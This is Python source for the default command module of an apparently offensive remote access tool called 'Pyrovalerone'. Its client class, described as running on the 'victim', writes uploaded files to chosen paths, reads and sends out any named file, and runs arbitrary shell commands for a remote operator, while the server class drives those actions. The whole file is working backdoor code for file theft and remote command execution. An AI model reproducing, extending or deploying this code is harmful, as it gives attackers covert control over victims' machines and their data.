"""
    Pyrovalerone
    Default OS Module
    Note: Features platform independant CRUD operations and code exection 
"""
import os
import base64
import shlex
import BDProtocol
import BDFramework
import subprocess

""""
	@class ClientMain
	@brief The block that will be invoked by the client (victim)
"""
class ClientMain:

	def __init__(self, handler:BDProtocol):
		self.handler = handler
		self.conn = handler.conn
		self.cmdModules = ["upload", "download", "exec"]

	def registerCMDModules(self, modules:list):

		# Iterate over every module to registered
		for module in modules:
		
			# Register the module if necessary
			if module not in self.cmdModules:
				self.cmdModules.append(module)


	def runCMD(self, cmdline:str):

		cmd = []

		if not cmdline:
			return "INVALID_ARGUMENT"

		try:

			print("M-DEFAULT->CLIENT: Lex is interpreting the command-line ")

			# Interpret cmdline into arguments array
			cmd = shlex.split(cmdline)

			# If no command was identified
			if len(cmd) < 1:
				return "INVALID_ARGUMENT"

		except Exception as exc:
			# Failed interpreting
			print("Shell lexer[Syntax error]: {}".format(cmdline))
			return "SHELL_LEXER_ERROR"

		# If module does not exist execute it on the current system
		if cmd[0] not in self.cmdModules:
		   return "CMD_NOT_FOUND"

		# Get the command's function
		cmdFunction = getattr(self, cmd[0])

		# Run the command
		return cmdFunction(cmd)

	def upload(self, argv):

		print("M-DEFAULT->CLIENT[UPLOAD]: Uploading from %s to %s..." % (argv[1], argv[2]))

		# Receive remote file path to write to
		RFILE = argv[2]

		try:

			# Create file stream for writing
			targetFile = open(RFILE, 'wb') 
			
			# Receive data from client
			data = self.handler.recv_msg()
			print("M-DEFAULT->CLIENT[UPLOAD]: Encoded byte size: {}".format(len(data)))

			# Decode data
			data = base64.b64decode(data.encode('ascii'))
			print("M-DEFAULT->CLIENT[UPLOAD]: Decoded byte size: {}".format(len(data)))

			# Write data to file
			targetFile.write(data)

			# Close file
			targetFile.close()

			print("M-DEFAULT->CLIENT[UPLOAD]: Upload successful")

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def download(self, argv):
		
		# Receive remote file path to read from
		filename = argv[1]
		try:

			# Create file stream for reading
			data = open(filename, 'rb').read()
			# Encode data
			data = base64.b64encode(data)

			# Send data to client
			self.handler.send_msg(data)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'


	def exec(self, argv):
		try:
			print("Running {}",format(argv[1:]))
			p = subprocess.run(argv[1:], capture_output=True, shell=True)
			return p.stdout.decode('ascii')
		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'


class ServerMain:

	def __init__(self, handler):
		self.handler = handler
		self.conn = handler.conn
		self.cmdModules = ["upload", "download", "exec", "goodbye", "help"]
		self.buildIns = ["goodbye", "help"]
		self.cmdModuleHelp = {
			"upload": "Usage: upload [LFILE] [RFILE]",
			"download": "Usage: download [RFILE] [LFILE]",
			"exec": "Usage: exec [REMOTE SYSTEM COMMAND]",
			"goodbye": "Usage: Close connection"
		}

## REGISTRATION FUNCTIONS
	def registerCMDHelp(self, cmd:str, usage:str):
		if cmd in self.cmdModules:
			if cmd not in self.cmdModuleHelp.keys():
				self.cmdModuleHelp[cmd] = usage

	def registerCMDBuiltIns(self, buildIns:list):
		for buildIn in buildIns:
			if buildIn not in self.buildIns:
				self.registerCMDModules([buildIn])
				self.buildIns.append(buildIn)

	def registerCMDModules(self, modules:list):
		for module in modules:
			if module not in self.cmdModules:
				self.cmdModules.append(module)

## MAIN PARSER FUNCTION
	def runCMD(self, cmdline):

		if not cmdline:
			return "INVALID_ARGUMENT"

		cmd = None

		try:

			# Interpret cmdline into arguments array
			cmd = shlex.split(cmdline)
		
		except Exception as exc:
			# Failed interpreting
			print("Shell lexer[Syntax error]: {}".format(cmdline))

		if cmd == None:
			return ""

		# If module does not exist execute it on the current system
		if cmd[0] not in self.cmdModules:
			os.system(" ".join(cmd))
			return

		# Get the command's function
		cmdFunction = getattr(self, cmd[0])

		# If its not a build-in function
		if cmd[0] not in self.buildIns:

			# Check the command's arguments
			result = cmdFunction(cmd, checkArgs=True)
		
			# Validate arguments before reaching client
			if result == "INVALID_ARGUMENT":
				return self.help(["help"]+cmd)

			# Notify victim of cmd to be executed
			print("Sending CMD {} to client...".format(cmd[0]))
			self.handler.send_msg(cmdline)

		# Running the command
		result = cmdFunction(cmd, checkArgs=False)

		return result

### BEGIN CMD FUNCTIONS

	def upload(self, argv, checkArgs=False):

		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		if checkArgs:
			return "OK"

		LFILE = argv[1] # Local file

		# Open lfile for reading
		DATA = open(LFILE, 'rb').read()

		# Encode data with base64
		DATA = base64.b64encode(DATA)

		# Send rfile data
		self.handler.send_msg(DATA)

		return self.handler.recv_msg()

	def download(self, argv, checkArgs):

		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		if checkArgs:
			return "OK"

		RFILE = argv[1] # Remote file
		LFILE = argv[2] # Local file

		# Receive file data
		DATA = self.handler.recv_msg()

		# Decode file data
		DATA = base64.b64decode(DATA)

		# Write data to file
		open(LFILE, 'wb').write(DATA)

		return self.handler.recv_msg()


	def exec(self, argv, checkArgs=False):
		
		if len(argv) < 2:
			return 'INVALID_ARGUMENT'

		if checkArgs:
			return "OK"

		print("M-DEFAULT->SERVER[EXEC]: Waiting for client response")
		return self.handler.recv_msg()
		

	def goodbye(self, argv, checkArgs=False):
		self.conn.close()
		self.conn = None

	def help(self, argv, checkArgs=False):


		if len(argv) > 1:

			page = argv[1]

			# If it is an existing module
			if page in self.cmdModules and page not in self.buildIns:

				# If a help page exists for the command
				if page in self.cmdModuleHelp.keys():

					# Print the usage
					print(self.cmdModuleHelp[page])

				# If no help page is available for this command
				else:
					print("{} has no manual page".format(page))

			# If the module does not exist
			else:
				print("No such module exists.")
				return "MODULE_NOT_FOUND"

		# If no arguments were provided
		else:

			print("Registered %d command modules: " % len(self.cmdModules))
			print("-" * 13)
			# Print all modules
			for module in self.cmdModules:
				print("-", module,"")

		return "CMD_SUCCESS"